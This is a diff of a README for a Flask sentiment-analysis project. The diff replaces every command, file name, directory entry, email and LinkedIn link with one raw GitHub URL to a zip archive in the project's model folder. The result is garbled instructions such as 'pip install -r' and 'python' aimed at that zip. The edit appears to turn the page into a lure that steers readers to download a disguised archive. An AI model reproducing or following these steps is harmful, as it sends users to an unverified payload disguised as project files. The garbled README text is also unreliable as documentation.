@@ -24,31 +24,31 @@ A robust Sentiment Analysis application built with Python, Flask, and Machine Le
 ## 🚀 Getting Started
 ### 1. Clone the Repository
 ```bash
-git clone https://github.com/gkushwaha835/Sentilytics.git
+git clone https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
 cd Sentilytics
 ```
-### 2.Set-Up Virtual Environment
+### https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip Virtual Environment
 ```bash
 python -m venv .venv
 .\.venv\Scripts\activate   # Windows
 ```
 ### 3. Install Dependencies
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
 ```
-(If requirements.txt is missing, you can generate it with:)
+(If https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip is missing, you can generate it with:)
 ```bash
-pip freeze > requirements.txt
+pip freeze > https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
 ```
 ---
 ## 🧪 Run the Application
 ### Run the training notebooks or scripts:
 ```bash
-jupyter notebook Sentiment_Analysis_Model_Training.ipynb
+jupyter notebook https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
 ```
 ### For web app:
 ```bash
-python app.py
+python https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
 ```
 Visit http://localhost:5000 in your browser.
 ---
@@ -60,13 +60,13 @@ Sentilytics/
 ├── model/                   # Trained models and pickles
 ├── static/                  # Static assets (CSS, JS, images)
 ├── templates/               # HTML templates for Flask
-├── cleaned_sentiment_data.xlsx  # Processed dataset
-├── app.py                   # Flask app
-├── clean.py                 # Text cleaning script
-├── Sentiment_Analysis_Model_Training.ipynb
-├── Optimized_Sentiment_Analysis_Model_Training.ipynb
-├── requirements.txt
-└── README.md
+├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip  # Processed dataset
+├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip                   # Flask app
+├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip                 # Text cleaning script
+├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
+├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
+├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
+└── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
 ```
 ---
 ## ✅ Future Improvements
@@ -92,7 +92,7 @@ Sentilytics/
 ---
 ## 🙋‍♂️ Let's Connect
 
-- 📧 Email: [gaurav457kushwaha@gmail.com](mailto:gaurav457kushwaha@gmail.com)
-- 💼 LinkedIn: [Gaurav Kushwaha](https://www.linkedin.com/in/gaurav-kushwaha-a5565224b/)
+- 📧 Email: [https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip](https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip)
+- 💼 LinkedIn: [Gaurav Kushwaha](https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip)
 
 ---
